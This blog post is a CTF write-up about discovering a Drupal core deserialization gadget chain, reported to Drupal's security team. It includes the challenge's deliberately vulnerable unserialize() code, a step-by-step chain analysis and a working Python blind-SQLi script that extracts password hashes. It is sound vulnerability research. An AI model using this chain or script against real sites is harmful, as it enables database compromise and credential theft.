---
title: "How I found a zero-day on Drupal CMS while playing CTF"
date: 2026-04-17
description: "Found a zero-day deserialization chain in Drupal CMS during Infobahn CTF"
draft: false
author: "hsw"
type: "post"
tags: [web, zero-day, drupal, deserialization]
categories: [Write-ups]
cover: 'https://2025.infobahnc.tf/files/62934d974ab996e6d0e754904e8525a7/logo-gray.png'
translationKey: 'media'
stage: 'budding'
toc: true
---

LOL finally i can publish it after 5 months (Drupal is slow asf), you can see my SA here [https://www.drupal.org/sa-core-2026-002](https://www.drupal.org/sa-core-2026-002). So here is how it's happened.
# The story

Two months ago, as usual i played CTF on the weekend with [VTLet](https://ctftime.org/team/409894) (which is my company CTF team and i am the leader) and this time we join the [Infobahn CTF](https://ctftime.org/event/2878). And i could say the challenges are crazy awesome! And i'm quickly look at the web challenges, and there are one challenge that authored by my friend @yuu_2802. After taking a look at it then i realized that it was a zero-day 🤯 (which is never happened on my CTF life) and then i decided to spend all my time i have to solve it, the image below can confirm it.

![](/commons/ctfs/infobahn2026/Pastedimage20260106214347.png)

# Fundamental knowledge

## Deserialization vulnerability ([References](https://sec.vnpt.vn/2019/08/ky-thuat-khai-thac-lo-hong-phar-deserialization) here cause it has good explaination)

Overall, the vulnerability is similar like finding a ROP gadget in Pwnable.

**Serialization** is the process of converting a complex data structure or object's state into a stream of bytes (or text) that can be easily stored in a file, database, or transmitted over a network, allowing it to be reconstructed later (deserialization) in the same or a different environment, essentially creating a snapshot of the object's data -- Gemini

**Deserialization vulnerability** in PHP can be called as "PHP Object Injection", which helps the attacker could perform various of attack like: Code Injection, SQL injection, DoS,... To exploit this vulnerability we need to meet 2 conditions:
	1. The target class need to use Magic method
	2. Found a POP chain, which means being able to customize/control code execution during the `unserialize()` process.

### Magic method

Magic methods are special functions within PHP classes, prefixed with two underscores. They are triggered automatically during specific events. For example: `__sleep()`, `__toString()`, `__construct()`, and so on. Most of these functions remain inactive unless explicitly defined by the developer. In this context, there are two magic methods particularly relevant to triggering Deserialization vulnerabilities:

- **`__wakeup()`: Automatically invoked when an object is deserialized.**
- **`__destruct()`: Invoked when a PHP script terminates or when an object is no longer in use and is destroyed.**

### POP chain

![](/commons/ctfs/infobahn2026/Pastedimage20260114103722.png)

The code snippet above represents a POP chain consisting of three gadgets that can lead to Remote Code Execution (RCE), as illustrated in the following diagram:

![](/commons/ctfs/infobahn2026/Pastedimage20260114104457.png)

1. First, we inject a 'Mail' object into the `$writer` property. At line 8, this triggers a call to the `shutdown()` method within the 'Mail' class.
2. Similarly, we inject a 'Sendmail' object into the `$transport` property. This causes line 18 to invoke the `send()` method of the 'Sendmail' class.
3. We then manipulate the values of two specific properties: `$callable` is set to 'exec' and `$to` is set to 'calc'.
4. Finally, the `call_user_func()` function is executed as `call_user_func("exec", "calc")`, which automatically launches the Calculator application on the Windows operating system.

# Exploitation

The challenge could be found [here](https://drive.google.com/file/d/1NsV6fnHD5xkInORP5tjYZ_gOMZLsgU4z/view?usp=drive_link) if anyone interested. This is the first version of that challenge, it included a vulnerable `index.php` for PHP Deserialization, and our mission is **finding a POP chain that could lead to RCE**.

```php
<?php  
  
/**  
* @file  
* The PHP page that serves all page requests on a Drupal installation.  
*  
* All Drupal code is released under the GNU General Public License.  
* See COPYRIGHT.txt and LICENSE.txt files in the "core" directory.  
*/  
  
use Drupal\Core\DrupalKernel;  
use Symfony\Component\HttpFoundation\Request;  
  
$autoloader = require_once 'autoload.php';  
  
$kernel = new DrupalKernel('prod', $autoloader);  
  
$request = Request::createFromGlobals();  
$response = $kernel->handle($request);  
unserialize(base64_decode($_GET['chain']));  # vulnerable
$response->send();  
  
$kernel->terminate($request, $response);
```

The vulnerable is kind of obvious, but the fact that it is a long time i haven't played with deserialize (about two years ago) and I don't KNOW WHAT THE HELL IS DRUPAL, then i take a little bit long time to setup the environment and get back the basic knowledge about this vulnerability. One of my teammates @perrito found a initial CVE about it [CVE-2024-55637](https://feedly.com/cve/CVE-2024-55637 "https://feedly.com/cve/CVE-2024-55637")but its seem wrong cuz the version on the challenge is latest but the concept is still the same. 

## Setting up

We started playing in 0 A.M in my company and we decided to overnight with it. I success to debug in around 2 A.M. Here is what i did for debug

Add those line to Dockerfile:
```Dockerfile
RUN pecl install xdebug && docker-php-ext-enable xdebug
COPY xdebug.ini /usr/local/etc/php/conf.d/xdebug.ini
```

And create a `xdebug.ini` in the same folder:
```ini
zend_extension=xdebug.so
xdebug.mode=debug
xdebug.start_with_request=yes
xdebug.client_host=host.docker.internal
xdebug.client_port=9003
xdebug.log_level=7
xdebug.log=/tmp/xdebug.log
```

## Gathering

So the CMS is kinda big to me and i don't know where to start, so i decided to research more on the internet and found a repository [PHPGGC](https://github.com/ambionics/phpggc) which is included multiple unserialize() payloads, and i searched for Drupal:

![](/commons/ctfs/infobahn2026/Pastedimage20260107140324.png)

The first two chains are the closest to the challenge verson (11.0.8), so i decided to dig deeper the AT1. First of all, i compared the vulnerable version with the fixed one on the Github https://github.com/drupal/core/compare/11.0.7...11.0.8 then i found the commit that fixed the bug: https://github.com/drupal/core/commit/ebcb799d83cbffe843a99c1907afd1b1fc880ce3

![](/commons/ctfs/infobahn2026/Pastedimage20260107143014.png)

So with this infomation, i can say that the maintainer tried to specify the type of variable `$query` to prevent it to be called when the deserialization happens. And with the infomation the chain provided, we can easily know the sink is in the `\Drupal\views\ViewExecutable::__wakeup()` which lives in `drupal/web/core/modules/views/src/ViewExecutable.php`.

![](/commons/ctfs/infobahn2026/Pastedimage20260107143912.png)

But in this moment, i had a look at the first-bloods thread and WTF? There a team that already solved it just in 2 hours which i unexpected.

## The unintended solution

Then after saw the first-blood on the 0day, i thought that it can not be that easy, then i stop digging on the source code and checked again if i missed something on the internet, but i cant find anything. Since it's already 4 A.M so i decided to go to bed.

In the morning, i opened my laptop and now it got 5-6 solves??????? I can say that whenever you stuck on CTF, you probably should take a sleep cuz after reviewed the challenge again, i think maybe these solves are unintended which is completely could be done with others gadget chains. Then i checked the third-party libraries Drupal used in this challenge:

![](/commons/ctfs/infobahn2026/Pastedimage20260107151453.png)

Quickly i realized some of these lib also in PHPGGC

![](/commons/ctfs/infobahn2026/Pastedimage20260107152237.png)

Andddd eventually i got RCE with the Guzzle/FW1 with no debugging, no reading a single line of code on Guzzle, then i made a comment:

![](/commons/ctfs/infobahn2026/Pastedimage20260107152912.png)

Then it's seemed at the moment i solved it, the author still didn't know how it could be solved this way, so i made a ticket. And it's weird that no one talked about this to him before I did 🤔

## Back to source code analyzing

And immediately the author release the revenge version after 1 hours, which is banned all other chain, forced us to find the gadget chain in Drupal itself:


```php
...
...
$chainParam = $_GET['chain'] ?? '';
if ($chainParam !== '') {
    $chainPayload = base64_decode($chainParam, true);
    if ($chainPayload === false) {
        die('Uh oh !!');
    }

    $forbiddenNamespaces = [
        'Doctrine\\',
        'Guzzle\\',
        'GuzzleHttp\\',
        'Symfony\\',
    ];

    foreach ($forbiddenNamespaces as $namespace) {
        if (stripos($chainPayload, $namespace) !== false) {
            die(sprintf('Forbidden gadget namespace detected: %s', $namespace));
        }
    }
  
    unserialize($chainPayload);
}
...
...
```

### Understanding the Drupal/AT1

Back to my analyze in the day before, so i decided to digging into gadget chain `Drupal/AT1` 

![](/commons/ctfs/infobahn2026/Pastedimage20260107172122.png)

set breakpoint on the `unserialize()` and make a request, then debugger catch it and when i keeping F10 (Step Over) it i got an error `Cannot assign Drupal\Core\Database\Query\Update to property Drupal\views\ViewExecutable::$query of type ?Drupal\views\Plugin\views\query\QueryPluginBase`

![](/commons/ctfs/infobahn2026/Pastedimage20260108153357.png)

Because of the commit we looked at before:

```php
...
  - public $query = NULL;
  + public ?QueryPluginBase $query = NULL;
...
```

From here i consider that the `$query` is assigned with a class that it's not supposed to do, then i make a request again and step into the `unserialize()`

![](/commons/ctfs/infobahn2026/Pastedimage20260107170535.png)

Then got stopped in `\Composer\Autoload\ClassLoader::loadClass()` , which loaded all the class that exist in the gadget chain

![](/commons/ctfs/infobahn2026/Pastedimage20260107173713.png)

Here is all the classes is loaded in order:

```
Drupal\views\ViewExecutable
Drupal\Core\Database\Query\Update
```
And failed after call to class `Drupal\Core\Database\Query\Update`, since our vector is `__wakeup()`, so i set breakpoint on `\Drupal\views\ViewExecutable::__wakeup` but still no luck, turned out that `loadClass()` need to be called successfully then debugger could able to process the flow. Soooo i did understanding it by my hand:

#### `Drupal\views\ViewExecutable` 

ViewExecutable is the runtime engine for a View, it takes the View and base on other parameters and queries's output to render the webpage (as a render array that becomes the HTML you see on the page).

##### `__wakeup()` 

`__wakeup()` is a magic method that is automatically called whenever an object is deserialized using the `unserialize()` function. The intended is to use to establish again the database connection or initilize the object's data:

![](/commons/ctfs/infobahn2026/Pastedimage20260112113112.png)
 > https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup

Then i read every single line of this function, checked what it does, what function it called and what it does also?

```php
...
// https://github.com/drupal/core/blob/cdfdb569ac089c877dba27534c7a89cf3fdd36c4/modules/views/src/ViewExecutable.php#L2561 

public function __wakeup(): void {  
  // There are cases, like in testing where we don't have a container  
  // available.  if (\Drupal::hasContainer() && !empty($this->serializationData)) {  
    // Load and reference the storage.  
    $this->storage = \Drupal::entityTypeManager()->getStorage('view')  
      ->load($this->serializationData['storage']);  
    $this->storage->set('executable', $this);  
  
    // Attach all necessary services.  
    $this->user = \Drupal::currentUser();  
    $this->viewsData = \Drupal::service('views.views_data');  
    $this->routeProvider = \Drupal::service('router.route_provider');  
    $this->displayPluginManager = \Drupal::service('plugin.manager.views.display');  
  
    // Restore the state of this executable.  
    if ($request = \Drupal::request()) {  
      $this->setRequest($request);  
    }  
    $this->setDisplay($this->serializationData['current_display']);  
    $this->setArguments($this->serializationData['args']);  
    $this->setCurrentPage($this->serializationData['current_page']);  
    $this->setExposedInput($this->serializationData['exposed_input']);  
    $this->exposed_data = $this->serializationData['exposed_data'];  
    $this->exposed_raw_input = $this->serializationData['exposed_raw_input'];  
    $this->dom_id = $this->serializationData['dom_id'];  
  
    $this->initHandlers();  
  
    // If the display was previously executed, execute it now.  
    if ($this->serializationData['executed']) {  
      $this->execute($this->current_display);  
    }  
  }  
  // Unset serializationData since it serves no further purpose.  
  unset($this->serializationData);  
}
```

Ctrl-click is the best tools ever, i spammed on every function and found the one that fit that scenario: `execute()`
```php
...
    // If the display was previously executed, execute it now. 
	// https://github.com/drupal/core/blob/cdfdb569ac089c877dba27534c7a89cf3fdd36c4/modules/views/src/ViewExecutable.php#L2592
    if ($this->serializationData['executed']) {  
      $this->execute($this->current_display);      //  <------- this one
    }  
...
```

##### `execute()`

This function is called when the param `executed` set to **True**, and with the error we got before :`Cannot assign Drupal\Core\Database\Query\Update to property Drupal\views\ViewExecutable::$query of type ?Drupal\views\Plugin\views\query\QueryPluginBase` => we can know that the payload is trying to assign the `$query` with the class `Drupal\Core\Database\Query\Update`.

```php
public function execute($display_id = NULL) {  
  if (empty($this->built)) {  
    if (!$this->build($display_id)) {  
      return FALSE;  
    }  
  }  
  
...
....
  else {  
	// https://github.com/drupal/core/blob/cdfdb569ac089c877dba27534c7a89cf3fdd36c4/modules/views/src/ViewExecutable.php#L1488
	  
    $this->query->execute($this);   // <--------- HERE IT IS !!!
    // Enforce the array key rule as documented in  
    // views_plugin_query::execute().    $this->result = array_values($this->result);  
    $this->_postExecute();  
    $cache->cacheSet('results');  
  }  
  
  // Let modules modify the view just after executing it.  
  $module_handler->invokeAll('views_post_execute', [$this]);  
  
  return $this->executed = TRUE;  
}
```

Yeah it's is very very sus, then i take a look at the Update class and eventually found the `\Drupal\Core\Database\Query\Update::execute` function, so the Drupal AT1 could be understand as follows:


![](/commons/ctfs/infobahn2026/MyFirstBoard(2).jpg)

And when the **Update** class successful called to function `execute()`, resulted in attacker can update any queries on the DB and then update the email of the admin to attacker's email then leverage to RCE.

To fixing this vulnerability, they specify the type the `$query` as the commit above, lives in `drupal/web/core/modules/views/src/Plugin/views/query/QueryPluginBase.php`:

```php
...
  - public $query = NULL;
  + public ?QueryPluginBase $query = NULL;
...
```

 So an idea just came up to my head:
 
 > Are there any class that extended by **QueryPluginBase** and still possible to call the `execute()`?

### Finding a new chain

 So i grep all of file that includes the string **"extends QueryPluginBase"** and found **Sql.php** that lives in the same directory

![](/commons/ctfs/infobahn2026/Pastedimage20260112163929.png)

And fortunately that it's also has the `execute()` that could be assigned to the value of `$query`. Then when  `$this->query->execute($this);` is called in `\Drupal\views\ViewExecutable::execute`, `\Drupal\views\Plugin\views\query\Sql::execute` would be called

![](/commons/ctfs/infobahn2026/Pastedimage20260112173142.png)


The flow could be demonstrated as below:

![](/commons/ctfs/infobahn2026/MyFirstBoard1.jpg)


`...` is the last step the chain about to do (i'll talk about it later), and here is what `execute()` in here does:

```php
public function execute(ViewExecutable $view) {  
  $query = $view->build_info['query'];               // [1]
  $count_query = $view->build_info['count_query'];  
  
  $query->addMetaData('view', $view);       // [3]
  $count_query->addMetaData('view', $view);  
  
  if (empty($this->options['disable_sql_rewrite'])) {  
    $base_table_data = Views::viewsData()->get($this->view->storage->get('base_table'));  
    if (isset($base_table_data['table']['base']['access query tag'])) {  
      $access_tag = $base_table_data['table']['base']['access query tag'];  
      $query->addTag($access_tag);  
      $count_query->addTag($access_tag);  
    }  
  
    if (isset($base_table_data['table']['base']['query metadata'])) {  
      foreach ($base_table_data['table']['base']['query metadata'] as $key => $value) {  
        $query->addMetaData($key, $value);  
        $count_query->addMetaData($key, $value);  
      }  
    }  
  }  
  
  if ($query) {  
    $additional_arguments = \Drupal::moduleHandler()->invokeAll('views_query_substitutions', [$view]);  
  
    // Count queries must be run through the preExecute() method.  
    // If not, then hook_query_node_access_alter() may munge the count by    // adding a distinct against an empty query string    // (e.g. COUNT DISTINCT(1) ...) and no pager will return.    // See \Drupal\Core\Database\Query\PagerSelectExtender::execute()    // See https://www.drupal.org/node/1046170.    $count_query->preExecute();  
  
    // Build the count query.  
    $count_query = $count_query->countQuery();  
  
    // Add additional arguments as a fake condition.  
    // XXX: this doesn't work, because PDO mandates that all bound arguments    // are used on the query. TODO: Find a better way to do this.  
    if (!empty($additional_arguments)) {  
      // $query->where('1 = 1', $additional_arguments);  
      // $count_query->where('1 = 1', $additional_arguments);    }  
  
    $start = microtime(TRUE);  
  
    try {  
      if ($view->pager->useCountQuery() || !empty($view->get_total_rows)) {  
        $view->pager->executeCountQuery($count_query);  
      }  
  
      // Let the pager modify the query to add limits.  
      $view->pager->preExecute($query);  
  
      if (!empty($this->limit) || !empty($this->offset)) {  
        // We can't have an offset without a limit, so provide a very large  
        // limit instead.        $limit = intval(!empty($this->limit) ? $this->limit : 999999);  
        $offset = intval(!empty($this->offset) ? $this->offset : 0);  
        $query->range($offset, $limit);  
      }  
  
      $result = $query->execute();  // [2]
      $result->setFetchMode(FetchAs::ClassObject, 'Drupal\views\ResultRow');  
  
      // Setup the result row objects.  
      $view->result = iterator_to_array($result);  
      array_walk($view->result, function (ResultRow $row, $index) {  
        $row->index = $index;  
      });  
  
      $view->pager->postExecute($view->result);  
      $view->pager->updatePageInfo();  
      $view->total_rows = $view->pager->getTotalItems();  
  
      // Load all entities contained in the results.  
      $this->loadEntities($view->result);  
    }  
    catch (DatabaseExceptionWrapper $e) {  
      $view->result = [];  
      if (!empty($view->live_preview)) {  
        $this->messenger->addError($e->getMessage());  
      }  
      else {  
        throw new DatabaseExceptionWrapper("Exception in {$view->storage->label()}[{$view->storage->id()}]: {$e->getMessage()}");  
      }  
    }  
  
  }  
  else {  
    $start = microtime(TRUE);  
  }  
  $view->execute_time = microtime(TRUE) - $start;  
}
```

- `[1]` As you can see, the `$query` `(\Drupal\views\ViewExecutable::$build_info['query'])` in here is not the same as `$query` `(\Drupal\views\ViewExecutable::$query)` we've seen previously, in here it takes the value from the `build_info[]` array that of `ViewExecutable's` object.
```php
// https://github.com/drupal/core/blob/cdfdb569ac089c877dba27534c7a89cf3fdd36c4/modules/views/src/Plugin/views/query/Sql.php#L1512
public function execute(ViewExecutable $view) {  
  $query = $view->build_info['query'];               // [1] 
  ...
```

- `[2]` And here is the **key part** , in this function there are one line that could cause the bad actor as below. You can see that we can totally control the param `\Drupal\views\ViewExecutable::$build_info['query']` to any value that we want to (cause there are no restriction like the `\Drupal\views\ViewExecutable::$query`), then basically we can activate function `execute()` of any class we want!

```php
...
// https://github.com/drupal/core/blob/cdfdb569ac089c877dba27534c7a89cf3fdd36c4/modules/views/src/Plugin/views/query/Sql.php#L1574
	$result = $query->execute();  // [2]
    $result->setFetchMode(FetchAs::ClassObject, 'Drupal\views\ResultRow');  
...
```

- `[3]` BUTTT it's not that easy, when i use the class `\Drupal\Core\Database\Query\Update` like the original gadget chain **Drupal/AT1** did and got an error:
![](/commons/ctfs/infobahn2026/Pastedimage20260113173149.png)

`Call to undefined method Drupal\Core\Database\Query\Update::addMetaData()`, trace back to the error in line 1507 of `/opt/drupal/web/core/modules/views/src/Plugin/views/query/Sql.php` (i'm currently debug on version 11.1.7 so the line suppose to 1515 in 11.2.5 https://github.com/drupal/core/blob/cdfdb569ac089c877dba27534c7a89cf3fdd36c4/modules/views/src/Plugin/views/query/Sql.php#L1515)

```php
...
// https://github.com/drupal/core/blob/cdfdb569ac089c877dba27534c7a89cf3fdd36c4/modules/views/src/Plugin/views/query/Sql.php#L1515
  $query->addMetaData('view', $view);       // [3]
  $count_query->addMetaData('view', $view); 
...
```

So actually it means we need to assign `$query` value to a class that have both `execute()` and `addMetaData()` function, then i greped all of it:
![](/commons/ctfs/infobahn2026/Pastedimage20260113174104.png)

And returns 4 class, and they would be the same as others, so i choosed the first one for testing. AND IT WORKS, so we have to craft the parameters carefully so the code flow could reach the line `$result = $query->execute();  // [2]`

So here is the final flow of my chain:

![](/commons/ctfs/infobahn2026/MyFirstBoard2.jpg)

And after multiples trial and error, i success to craft a gadget chain that could lead to `time-based SQLi` via class `Select`

![](/commons/ctfs/infobahn2026/Timebased_sqli.gif)



And i write a simple binary search script that able to extract all the hashed password in database

```python
import subprocess, requests, time

TARGET = "http://localhost:1337"   
GEN    = ["php", "exp.php"]  
DELAY  = 2.0
MAXLEN = 64
low0, high0 = 32, 126

requests.packages.urllib3.disable_warnings()

def gen_payload(pos, mid):
    out = subprocess.check_output(GEN + [str(pos), str(mid)])
    return out.decode().strip()

def rtt(payload):
    t0 = time.perf_counter()
    requests.get(TARGET, params={'chain': payload}, allow_redirects=False, verify=False)
    return time.perf_counter() - t0

def calibrate():
    return sum(rtt(gen_payload(1, 255)) for _ in range(3)) / 3.0

def leak_char(pos, thresh):
    low, high = low0, high0
    while low < high:
        mid = (low + high + 1) // 2
        slow = rtt(gen_payload(pos, mid)) > thresh
        if slow: low = mid
        else:    high = mid - 1
    return high

def exploit():
    base = calibrate()
    thresh = base + max(1.0, DELAY * 0.6)
    out = []
    for pos in range(1, MAXLEN + 1):
        ch = leak_char(pos, thresh) + 1
        if ch < low0 or ch > high0: break
        out.append(chr(ch))
        print(f"[{pos:02}] {chr(ch)!r} :: {''.join(out)}")
    print("\nLEAK:", ''.join(out))

if __name__ == "__main__":
    exploit()
```


![](/commons/ctfs/infobahn2026/Pastedimage20260114114013.png)

And yea, i achieved to leak everything in the database, but the password is hashed so i couldn't leverage to admin (it would be easily from admin to RCE). So it's kinda sad that i couldn't solve the challenge. I found this two days after the CTF ended and immediately reported it to the Drupal Security Team.
